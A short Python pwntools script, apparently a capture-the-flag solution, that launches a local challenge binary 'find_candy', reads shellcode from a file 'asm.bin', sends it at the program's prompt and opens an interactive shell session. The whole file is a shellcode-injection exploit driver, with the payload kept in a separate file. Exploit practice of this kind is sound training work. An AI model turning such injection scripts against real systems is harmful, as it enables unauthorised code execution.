#!/usr/bin/python3

import os
from pwn import *
p = process('./find_candy')

with open('./asm.bin','rb') as f:
    shellcode = f.read()

print(p.recvuntil(b'shellcode: ').decode())
p.send(shellcode)

p.interactive()
